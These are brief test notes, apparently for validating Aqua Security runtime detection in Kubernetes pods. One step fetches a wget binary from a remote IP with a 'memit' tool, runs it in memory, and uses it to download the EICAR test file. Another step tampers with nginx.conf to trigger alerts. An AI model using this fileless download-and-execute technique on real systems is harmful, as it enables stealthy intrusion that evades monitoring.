modify Aqua Server policy
put wget to some http server , like http://10.8.15.200/wget
kubectl apply -f test.yaml
kubectl exec -it fileless -- sh
cd /var/
./memit http://54.235.227.190:8080/wget -- --no-check-certificate https://secure.eicar.org/eicar.com.txt
check logs


cd /AQUA-POC/02-Runtime/02-2/
kubectl apply -f nginx.yaml
kubectl exec -it nginx -- sh
echo "sfaefaedf" >> /etc/nginx/nginx.conf
check logs
 



